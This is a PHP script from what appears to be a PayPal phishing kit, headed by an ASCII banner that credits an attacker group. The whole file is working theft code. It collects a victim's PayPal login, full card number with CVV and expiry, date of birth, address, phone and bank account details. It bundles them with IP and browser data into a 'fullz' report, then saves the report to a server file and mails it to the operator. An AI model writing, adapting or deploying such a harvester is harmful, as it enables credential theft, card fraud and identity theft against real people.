<?php
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ 
FuCkEd By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
*/
    if(isset($_POST['cardNumber'])&&isset($_POST['fullName'])){
	
	$ip = $_SESSION['ip'];
	$city = $_SESSION['ip_city'];
	$country = $_SESSION['ip_countryName'];
	$currency = $_SESSION['currency'];
	$browser = $_SESSION['browser'];
	$os = $_SESSION['os'];
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$timezone = $_SESSION['ip_timezone'];
	$time = "".date("d/m/Y h:i:sa")." GMT";
	

	$email = $_POST['eml'];
	$pwd = $_POST['pwd'];
	$card = $_POST['cardNumber'];

	$bin = substr($card, 0, 6);
	$bin = str_replace(' ', '', $bin);
	
	$exp = $_POST['expiryDate'];
	$csc = $_POST['csc'];
	$fullName = $_POST['fullName'];
	$dateofbirth = $_POST['dateofbirth'];
	$phone = $_POST['phone'];
	$address = $_POST['address'];
	$city = $_POST['city'];
	$zipcode = $_POST['zipcode'];
		
        ########################################################
        ############# [+] SESSION INFORMATION [+] ##############
		########################################################
	$subject="PP Fullz [{$bin}] From [{$_SESSION['ip_countryName']}]";
	$msg="
+ ------------------------------------------+
+ ---------- Tele @dataspecialist --------- +
| Full Name	: $fullName
| Birth Date	: $dateofbirth
| Mobile No.	: $phone
| Address		: $address
| City		: $city
| Zip Code	: $zipcode
| Country		: $country
+ ------------------------------------------+
+ --------------- PP Login ---------------- +

| Email	: $email
| Pass	: $pwd

+ ------------------------------------------+
+ ----------------- CC Info --------------- +
| Number	: $card
| Expiry	: $exp
| CVV			: $csc";
if( isset($_POST['account']) ){
	$sortcode = $_POST['sortcode'];
	$account = $_POST['account'];
	$msg .= "
	| Sort Code	: $sortcode
	| Account Number	: $account";
}

$msg.= "+ ------------------------------------------+
+ --------------- IP Info ----------------- +
| IP ADDRESS	: $ip
| LOCATION	: $city , $country
| CURRENCY    : $currency
| BROWSER		: $browser on $os
| USER AGENT	: $user_agent
| TIMEZONE	: $timezone
| TIME		: $time
+ ------------------------------------------+
";
if ($saveintext=="yes") {
	$save=fopen("../../".$filename.".txt","a+");
	fwrite($save,$msg);
	fclose($save);
}

mail($to,$subject,$msg);
}
?>